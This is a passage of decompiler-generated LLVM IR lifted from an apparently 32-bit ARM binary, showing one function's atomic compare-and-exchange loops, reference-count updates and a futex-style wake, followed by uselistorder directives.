  %v0_16bf0 = load i32, i32* %r6.global-to-local, align 4
  %v1_16bf0 = load i32, i32* %r7.global-to-local, align 4
  %v2_16bf0 = add i32 %v1_16bf0, 8
  %v3_16bf0 = inttoptr i32 %v2_16bf0 to i32*
  store i32 %v0_16bf0, i32* %v3_16bf0, align 4
  br label %dec_label_pc_16bf4

dec_label_pc_16bf4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16bf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16bf8 = add i32 %v0_16bf8, 160
  %v3_16bf8 = inttoptr i32 %v2_16bf8 to i32*
  %v4_16bf8 = load i32, i32* %v3_16bf8, align 4
  store i32 %v4_16bf8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16c00 = add i32 %v0_16bf8, 12
  %v3_16c00 = inttoptr i32 %v2_16c00 to i32*
  %v4_16c00 = load i32, i32* %v3_16c00, align 4
  store i32 %v4_16c00, i32* %r3.global-to-local, align 4
  %v1_16c04 = inttoptr i32 %v4_16c00 to i32*
  %v2_16c04 = load i32, i32* %v1_16c04, align 4
  store i32 %v2_16c04, i32* %r1.global-to-local, align 4
  %v1_16c08 = add i32 %v4_16bf8, 4
  %v2_16c08 = inttoptr i32 %v1_16c08 to i32*
  %v3_16c08 = load i32, i32* %v2_16c08, align 4
  %v2_16c0c = icmp ne i32 %v2_16c04, 0
  store i1 %v2_16c0c, i1* %cpsr_c.global-to-local, align 1
  %v7_16c0c = icmp eq i32 %v2_16c04, 1
  %v1_16c10 = add i32 %v3_16c08, 1
  store i32 %v1_16c10, i32* %r3.global-to-local, align 4
  store i32 %v1_16c10, i32* %v2_16c08, align 4
  br i1 %v7_16c0c, label %dec_label_pc_16c1c, label %dec_label_pc_16d80

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16bf4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16c20 = load i32, i32* %r5.global-to-local, align 4
  %v2_16c20 = add i32 %v0_16c20, 80
  %v3_16c20 = inttoptr i32 %v2_16c20 to i32*
  %v4_16c20 = load i32, i32* %v3_16c20, align 4
  store i32 %v4_16c20, i32* %r3.global-to-local, align 4
  %v1_16c24 = inttoptr i32 %v4_16c20 to i32*
  %v2_16c24 = load i32, i32* %v1_16c24, align 4
  store i32 %v2_16c24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16c24, 1
  br i1 %tmp46, label %dec_label_pc_16d80, label %dec_label_pc_16c30

dec_label_pc_16c30:                               ; preds = %dec_label_pc_16c1c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16c34 = add i32 %v0_16c20, 152
  %v3_16c34 = inttoptr i32 %v2_16c34 to i32*
  %v4_16c34 = load i32, i32* %v3_16c34, align 4
  store i32 %v4_16c34, i32* %r7.global-to-local, align 4
  %v1_16c38 = add i32 %v4_16c34, 8
  %v2_16c38 = inttoptr i32 %v1_16c38 to i32*
  %v3_16c38 = load i32, i32* %v2_16c38, align 4
  store i32 %v3_16c38, i32* %r3.global-to-local, align 4
  %v1_16c3c = load i32, i32* %r6.global-to-local, align 4
  %v3_16c3c = icmp uge i32 %v3_16c38, %v1_16c3c
  store i1 %v3_16c3c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c3c = icmp eq i32 %v3_16c38, %v1_16c3c
  br i1 %v9_16c3c, label %dec_label_pc_16c80, label %dec_label_pc_16c44

dec_label_pc_16c44:                               ; preds = %dec_label_pc_16c30
  store i32 %v4_16c34, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16c4c86 = inttoptr i32 %v4_16c34 to i32*
  %v2_16c4c87 = load i32, i32* %v1_16c4c86, align 4
  store i32 %v2_16c4c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16c5089 = icmp eq i32 %v2_16c4c87, 0
  br i1 %v9_16c5089, label %dec_label_pc_16c58, label %dec_label_pc_16c70

dec_label_pc_16c58:                               ; preds = %dec_label_pc_16c44, %dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge
  %v0_16c5890 = phi i32 [ %v1_16c50.pre, %dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge ], [ 0, %dec_label_pc_16c44 ]
  store i32 %v0_16c5890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c68, label %dec_label_pc_16c6c, label %dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge

dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge:  ; preds = %dec_label_pc_16c58
  %v0_16c4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c50.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16c4c = inttoptr i32 %v0_16c4c.pre to i32*
  %v2_16c4c = load i32, i32* %v1_16c4c, align 4
  store i32 %v2_16c4c, i32* %r3.global-to-local, align 4
  %v3_16c50 = icmp uge i32 %v2_16c4c, %v1_16c50.pre
  store i1 %v3_16c50, i1* %cpsr_c.global-to-local, align 1
  %v9_16c50 = icmp eq i32 %v2_16c4c, %v1_16c50.pre
  br i1 %v9_16c50, label %dec_label_pc_16c58, label %dec_label_pc_16c70

dec_label_pc_16c6c:                               ; preds = %dec_label_pc_16c58
  %v0_16c6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16c6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c70

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c44, %dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge, %dec_label_pc_16c6c
  %v0_16c70 = phi i32 [ %v0_16c6c, %dec_label_pc_16c6c ], [ %v2_16c4c87, %dec_label_pc_16c44 ], [ %v2_16c4c, %dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge ]
  %v1_16c70 = phi i32 [ %v0_16c6c, %dec_label_pc_16c6c ], [ 0, %dec_label_pc_16c44 ], [ %v1_16c50.pre, %dec_label_pc_16c58.dec_label_pc_16c4c_crit_edge ]
  %v3_16c70 = icmp uge i32 %v0_16c70, %v1_16c70
  store i1 %v3_16c70, i1* %cpsr_c.global-to-local, align 1
  %v9_16c70 = icmp eq i32 %v0_16c70, %v1_16c70
  br i1 %v9_16c70, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16c70
  %v1_16c74 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16c74, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16c70, %bb47
  %v1_16c78 = xor i1 %v9_16c70, true
  call void @__pseudo_cond_branch(i1 %v1_16c78, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_16c7c = load i32, i32* %r6.global-to-local, align 4
  %v1_16c7c = load i32, i32* %r7.global-to-local, align 4
  %v2_16c7c = add i32 %v1_16c7c, 8
  %v3_16c7c = inttoptr i32 %v2_16c7c to i32*
  store i32 %v0_16c7c, i32* %v3_16c7c, align 4
  %v0_16c88.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16c80

dec_label_pc_16c80:                               ; preds = %dec_label_pc_16c30, %bb48
  %v0_16c88 = phi i32 [ %v0_16c20, %dec_label_pc_16c30 ], [ %v0_16c88.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16c88 = add i32 %v0_16c88, 152
  %v3_16c88 = inttoptr i32 %v2_16c88 to i32*
  %v4_16c88 = load i32, i32* %v3_16c88, align 4
  store i32 %v4_16c88, i32* %r0.global-to-local, align 4
  %v2_16c8c = add i32 %v0_16c88, 76
  %v3_16c8c = inttoptr i32 %v2_16c8c to i32*
  %v4_16c8c = load i32, i32* %v3_16c8c, align 4
  store i32 %v4_16c8c, i32* %r2.global-to-local, align 4
  %v1_16c90 = add i32 %v4_16c88, 4
  %v2_16c90 = inttoptr i32 %v1_16c90 to i32*
  %v3_16c90 = load i32, i32* %v2_16c90, align 4
  store i32 %v3_16c90, i32* %r3.global-to-local, align 4
  %v1_16c94 = inttoptr i32 %v4_16c8c to i32*
  %v2_16c94 = load i32, i32* %v1_16c94, align 4
  store i32 %v2_16c94, i32* %r2.global-to-local, align 4
  %v1_16c98 = add i32 %v3_16c90, 1
  store i32 %v1_16c98, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16c98, i32* %v2_16c90, align 4
  %v0_16ce8.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ce811 = icmp eq i32 %v0_16ce8.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16ce811, label %dec_label_pc_16cf4, label %dec_label_pc_16cac

dec_label_pc_16cac:                               ; preds = %dec_label_pc_16c80, %dec_label_pc_16ce4
  %v0_16cd02 = phi i32 [ %v0_16ce4, %dec_label_pc_16ce4 ], [ %v0_16ce8.pr, %dec_label_pc_16c80 ]
  %v1_16cac = inttoptr i32 %v0_16cd02 to i16*
  %v2_16cac = load i16, i16* %v1_16cac, align 2
  %v3_16cac = zext i16 %v2_16cac to i32
  store i32 %v3_16cac, i32* %r3.global-to-local, align 4
  %v2_16cb0 = and i32 %v3_16cac, 32816
  store i32 %v2_16cb0, i32* %r1.global-to-local, align 4
  %v2_16cb4 = icmp ugt i32 %v2_16cb0, 47
  store i1 %v2_16cb4, i1* %cpsr_c.global-to-local, align 1
  %v7_16cb4 = icmp eq i32 %v2_16cb0, 48
  %v1_16cb8 = add i32 %v0_16cd02, 32
  %v2_16cb8 = inttoptr i32 %v1_16cb8 to i32*
  %v3_16cb8 = load i32, i32* %v2_16cb8, align 4
  store i32 %v3_16cb8, i32* %r4.global-to-local, align 4
  br i1 %v7_16cb4, label %dec_label_pc_16cc4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_16cac
  store i32 %v0_16cd02, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16ce4

dec_label_pc_16cc4:                               ; preds = %dec_label_pc_16cac
  %v0_16cc4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cc4 = icmp eq i32 %v0_16cc4, 0
  br i1 %v2_16cc4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16cc4
  %v1_16cc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16cc8 = load i32, i32* %r7.global-to-local, align 4
  %v3_16cc8 = add i32 %v2_16cc8, %v1_16cc8
  %v4_16cc8 = inttoptr i32 %v3_16cc8 to i32*
  %v5_16cc8 = load i32, i32* %v4_16cc8, align 4
  store i32 %v5_16cc8, i32* %r3.global-to-local, align 4
  %v3_16ccc = inttoptr i32 %v5_16cc8 to i32*
  store i32 %v3_16cb8, i32* %v3_16ccc, align 4
  %v0_16cd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16cd0 = inttoptr i32 %v0_16cd0 to i16*
  %v2_16cd0 = load i16, i16* %v1_16cd0, align 2
  %v3_16cd0 = zext i16 %v2_16cd0 to i32
  store i32 %v3_16cd0, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16cc4
  %v2_16cd08 = load i16, i16* %v1_16cac, align 2
  %v3_16cd09 = zext i16 %v2_16cd08 to i32
  store i32 %v3_16cd09, i32* %r3.global-to-local, align 4
  %v3_16cd4 = add i32 %v0_16cc4, 32
  %v4_16cd4 = inttoptr i32 %v3_16cd4 to i32*
  store i32 %v3_16cb8, i32* %v4_16cd4, align 4
  %v0_16cd8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16cd8 = phi i32 [ %v3_16cd0, %.thread ], [ %v0_16cd8.pre, %bb49 ]
  %v1_16cd8 = and i32 %v0_16cd8, 8192
  %v2_16cd8 = icmp eq i32 %v1_16cd8, 0
  br i1 %v2_16cd8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_16cdc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_16cdc, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16ce0 = xor i1 %v2_16cd8, true
  call void @__pseudo_cond_branch(i1 %v1_16ce0, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  %v0_16ce4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16ce4

dec_label_pc_16ce4:                               ; preds = %.thread38, %bb52
  %v0_16ce4 = phi i32 [ %v0_16ce4.pre, %bb52 ], [ %v3_16cb8, %.thread38 ]
  store i32 %v0_16ce4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ce8 = icmp eq i32 %v0_16ce4, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16ce8, label %dec_label_pc_16cf4, label %dec_label_pc_16cac

dec_label_pc_16cf4:                               ; preds = %dec_label_pc_16ce4, %dec_label_pc_16c80
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16cf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16cf8 = add i32 %v0_16cf8, 152
  %v3_16cf8 = inttoptr i32 %v2_16cf8 to i32*
  %v4_16cf8 = load i32, i32* %v3_16cf8, align 4
  store i32 %v4_16cf8, i32* %r0.global-to-local, align 4
  %v1_16cfc = add i32 %v4_16cf8, 4
  %v2_16cfc = inttoptr i32 %v1_16cfc to i32*
  %v3_16cfc = load i32, i32* %v2_16cfc, align 4
  %v1_16d00 = add i32 %v3_16cfc, -1
  store i32 %v1_16d00, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d04 = icmp eq i32 %v1_16d00, 0
  store i32 %v1_16d00, i32* %v2_16cfc, align 4
  br i1 %v2_16d04, label %dec_label_pc_16d10, label %dec_label_pc_16d70

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16cf4
  %v0_16d10 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d10 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d10 = add i32 %v1_16d10, 8
  %v3_16d10 = inttoptr i32 %v2_16d10 to i32*
  store i32 %v0_16d10, i32* %v3_16d10, align 4
  %v0_16d14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d14, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d18

dec_label_pc_16d18:                               ; preds = %dec_label_pc_16d48.dec_label_pc_16d18_crit_edge, %dec_label_pc_16d10
  %v0_16d18 = phi i32 [ %v0_16d18.pre, %dec_label_pc_16d48.dec_label_pc_16d18_crit_edge ], [ %v0_16d14, %dec_label_pc_16d10 ]
  %v1_16d18 = inttoptr i32 %v0_16d18 to i32*
  %v2_16d18 = load i32, i32* %v1_16d18, align 4
  store i32 %v2_16d18, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d18, i32* %r2.global-to-local, align 4
  %v2_16d2474 = load i32, i32* %v1_16d18, align 4
  store i32 %v2_16d2474, i32* %r3.global-to-local, align 4
  %v3_16d2876 = icmp uge i32 %v2_16d2474, %v2_16d18
  store i1 %v3_16d2876, i1* %cpsr_c.global-to-local, align 1
  %v9_16d2882 = icmp eq i32 %v2_16d2474, %v2_16d18
  br i1 %v9_16d2882, label %dec_label_pc_16d30, label %dec_label_pc_16d48

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d18, %dec_label_pc_16d30.dec_label_pc_16d24_crit_edge
  %v0_16d3083 = phi i32 [ %v1_16d28.pre, %dec_label_pc_16d30.dec_label_pc_16d24_crit_edge ], [ %v2_16d18, %dec_label_pc_16d18 ]
  store i32 %v0_16d3083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d40, label %dec_label_pc_16d44, label %dec_label_pc_16d30.dec_label_pc_16d24_crit_edge

dec_label_pc_16d30.dec_label_pc_16d24_crit_edge:  ; preds = %dec_label_pc_16d30
  %v0_16d24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d28.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16d24 = inttoptr i32 %v0_16d24.pre to i32*
  %v2_16d24 = load i32, i32* %v1_16d24, align 4
  store i32 %v2_16d24, i32* %r3.global-to-local, align 4
  %v3_16d28 = icmp uge i32 %v2_16d24, %v1_16d28.pre
  store i1 %v3_16d28, i1* %cpsr_c.global-to-local, align 1
  %v9_16d28 = icmp eq i32 %v2_16d24, %v1_16d28.pre
  br i1 %v9_16d28, label %dec_label_pc_16d30, label %dec_label_pc_16d48

dec_label_pc_16d44:                               ; preds = %dec_label_pc_16d30
  %v0_16d44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16d44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d48

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d18, %dec_label_pc_16d30.dec_label_pc_16d24_crit_edge, %dec_label_pc_16d44
  %v0_16d50 = phi i32 [ %v0_16d44, %dec_label_pc_16d44 ], [ %v2_16d2474, %dec_label_pc_16d18 ], [ %v2_16d24, %dec_label_pc_16d30.dec_label_pc_16d24_crit_edge ]
  %v1_16d48 = phi i32 [ %v0_16d44, %dec_label_pc_16d44 ], [ %v2_16d18, %dec_label_pc_16d18 ], [ %v1_16d28.pre, %dec_label_pc_16d30.dec_label_pc_16d24_crit_edge ]
  %v3_16d48 = icmp uge i32 %v0_16d50, %v1_16d48
  store i1 %v3_16d48, i1* %cpsr_c.global-to-local, align 1
  %v9_16d48 = icmp eq i32 %v0_16d50, %v1_16d48
  br i1 %v9_16d48, label %dec_label_pc_16d50, label %dec_label_pc_16d48.dec_label_pc_16d18_crit_edge

dec_label_pc_16d48.dec_label_pc_16d18_crit_edge:  ; preds = %dec_label_pc_16d48
  %v0_16d18.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d18

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d48
  %v2_16d50 = icmp ne i32 %v1_16d48, 0
  store i1 %v2_16d50, i1* %cpsr_c.global-to-local, align 1
  %v7_16d54 = icmp slt i32 %v1_16d48, 2
  br i1 %v7_16d54, label %dec_label_pc_16d70, label %dec_label_pc_16d58

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d50
  %v0_16d58 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16d58, i32* %r0.global-to-local, align 4
  %v0_16d5c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d5c = add i32 %v0_16d5c, 129
  store i32 %v1_16d5c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d70

dec_label_pc_16d70:                               ; preds = %dec_label_pc_16cf4, %dec_label_pc_16d58, %dec_label_pc_16d50
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16d74 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d74 = add i32 %v0_16d74, 80
  %v3_16d74 = inttoptr i32 %v2_16d74 to i32*
  %v4_16d74 = load i32, i32* %v3_16d74, align 4
  store i32 %v4_16d74, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16d7c = inttoptr i32 %v4_16d74 to i32*
  store i32 0, i32* %v2_16d7c, align 4
  br label %dec_label_pc_16d80

dec_label_pc_16d80:                               ; preds = %dec_label_pc_16bf4, %dec_label_pc_16c1c, %dec_label_pc_16d70
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16d84 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d84 = add i32 %v0_16d84, 160
  %v3_16d84 = inttoptr i32 %v2_16d84 to i32*
  %v4_16d84 = load i32, i32* %v3_16d84, align 4
  store i32 %v4_16d84, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16d8c = add i32 %v0_16d84, 12
  %v3_16d8c = inttoptr i32 %v2_16d8c to i32*
  %v4_16d8c = load i32, i32* %v3_16d8c, align 4
  store i32 %v4_16d8c, i32* %r1.global-to-local, align 4
  %v1_16d90 = add i32 %v4_16d84, 4
  %v2_16d90 = inttoptr i32 %v1_16d90 to i32*
  %v3_16d90 = load i32, i32* %v2_16d90, align 4
  store i32 %v3_16d90, i32* %r2.global-to-local, align 4
  %v1_16d94 = inttoptr i32 %v4_16d8c to i32*
  %v2_16d94 = load i32, i32* %v1_16d94, align 4
  %v1_16d98 = add i32 %v3_16d90, -1
  store i32 %v1_16d98, i32* %r2.global-to-local, align 4
  %v1_16d9c = add i32 %v2_16d94, -1
  store i32 %v1_16d9c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16da0 = icmp eq i32 %v1_16d98, 0
  store i32 %v1_16d9c, i32* %v1_16d94, align 4
  %v0_16da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16da8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16da8 = add i32 %v1_16da8, 4
  %v3_16da8 = inttoptr i32 %v2_16da8 to i32*
  store i32 %v0_16da8, i32* %v3_16da8, align 4
  br i1 %v2_16da0, label %dec_label_pc_16db0, label %dec_label_pc_16e10

dec_label_pc_16db0:                               ; preds = %dec_label_pc_16d80
  %v0_16db0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16db0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16db0 = add i32 %v1_16db0, 8
  %v3_16db0 = inttoptr i32 %v2_16db0 to i32*
  store i32 %v0_16db0, i32* %v3_16db0, align 4
  %v0_16db4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16db4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16db8

dec_label_pc_16db8:                               ; preds = %dec_label_pc_16de8.dec_label_pc_16db8_crit_edge, %dec_label_pc_16db0
  %v0_16db8 = phi i32 [ %v0_16db8.pre, %dec_label_pc_16de8.dec_label_pc_16db8_crit_edge ], [ %v0_16db4, %dec_label_pc_16db0 ]
  %v1_16db8 = inttoptr i32 %v0_16db8 to i32*
  %v2_16db8 = load i32, i32* %v1_16db8, align 4
  store i32 %v2_16db8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16db8, i32* %r2.global-to-local, align 4
  %v2_16dc462 = load i32, i32* %v1_16db8, align 4
  store i32 %v2_16dc462, i32* %r3.global-to-local, align 4
  %v3_16dc864 = icmp uge i32 %v2_16dc462, %v2_16db8
  store i1 %v3_16dc864, i1* %cpsr_c.global-to-local, align 1
  %v9_16dc870 = icmp eq i32 %v2_16dc462, %v2_16db8
  br i1 %v9_16dc870, label %dec_label_pc_16dd0, label %dec_label_pc_16de8

dec_label_pc_16dd0:                               ; preds = %dec_label_pc_16db8, %dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge
  %v0_16dd071 = phi i32 [ %v1_16dc8.pre, %dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge ], [ %v2_16db8, %dec_label_pc_16db8 ]
  store i32 %v0_16dd071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16de0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16de0, label %dec_label_pc_16de4, label %dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge

dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge:  ; preds = %dec_label_pc_16dd0
  %v0_16dc4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16dc8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16dc4 = inttoptr i32 %v0_16dc4.pre to i32*
  %v2_16dc4 = load i32, i32* %v1_16dc4, align 4
  store i32 %v2_16dc4, i32* %r3.global-to-local, align 4
  %v3_16dc8 = icmp uge i32 %v2_16dc4, %v1_16dc8.pre
  store i1 %v3_16dc8, i1* %cpsr_c.global-to-local, align 1
  %v9_16dc8 = icmp eq i32 %v2_16dc4, %v1_16dc8.pre
  br i1 %v9_16dc8, label %dec_label_pc_16dd0, label %dec_label_pc_16de8

dec_label_pc_16de4:                               ; preds = %dec_label_pc_16dd0
  %v0_16de4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16de4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16de8

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16db8, %dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge, %dec_label_pc_16de4
  %v0_16df0 = phi i32 [ %v0_16de4, %dec_label_pc_16de4 ], [ %v2_16dc462, %dec_label_pc_16db8 ], [ %v2_16dc4, %dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge ]
  %v1_16de8 = phi i32 [ %v0_16de4, %dec_label_pc_16de4 ], [ %v2_16db8, %dec_label_pc_16db8 ], [ %v1_16dc8.pre, %dec_label_pc_16dd0.dec_label_pc_16dc4_crit_edge ]
  %v3_16de8 = icmp uge i32 %v0_16df0, %v1_16de8
  store i1 %v3_16de8, i1* %cpsr_c.global-to-local, align 1
  %v9_16de8 = icmp eq i32 %v0_16df0, %v1_16de8
  br i1 %v9_16de8, label %dec_label_pc_16df0, label %dec_label_pc_16de8.dec_label_pc_16db8_crit_edge

dec_label_pc_16de8.dec_label_pc_16db8_crit_edge:  ; preds = %dec_label_pc_16de8
  %v0_16db8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16db8

dec_label_pc_16df0:                               ; preds = %dec_label_pc_16de8
  %v2_16df0 = icmp ne i32 %v1_16de8, 0
  store i1 %v2_16df0, i1* %cpsr_c.global-to-local, align 1
  %v7_16df4 = icmp slt i32 %v1_16de8, 2
  br i1 %v7_16df4, label %dec_label_pc_16e10, label %dec_label_pc_16df8

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16df0
  %v0_16df8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16df8, i32* %r0.global-to-local, align 4
  %v0_16dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_16dfc = add i32 %v0_16dfc, 129
  store i32 %v1_16dfc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16e10

dec_label_pc_16e10:                               ; preds = %dec_label_pc_16d80, %dec_label_pc_16df8, %dec_label_pc_16df0
  %v2_16e14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e14, i32* %r4.global-to-local, align 4
  %v1_16e18 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16e18

; uselistorder directives
  uselistorder i32 %v0_16de4, { 1, 0, 2 }
  uselistorder i32 %v1_16dc8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16db8, { 1, 0 }
  uselistorder i32 %v0_16d44, { 1, 0, 2 }
  uselistorder i32 %v1_16d28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d18, { 1, 0 }
  uselistorder i32 %v0_16ce4, { 2, 1, 0 }
  uselistorder i32 %v0_16c88, { 1, 0 }
  uselistorder i32 %v0_16c6c, { 1, 0, 2 }
  uselistorder i32 %v1_16c50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16c3c, { 1, 0 }
  uselistorder i32 %v0_16be0, { 1, 0, 2 }
  uselistorder i32 %v1_16bc4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16b98, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 40, 4, 5, 6, 7, 8, 9, 10, 12, 11, 41, 13, 14, 15, 43, 44, 16, 17, 18, 19, 20, 21, 22, 24, 23, 42, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 39, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 22, 23, 5, 6, 7, 8, 24, 25, 9, 12, 10, 11, 1, 13, 15, 14, 0, 16, 17, 18, 19, 20, 26, 27, 21 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16de8, { 2, 1, 0 }
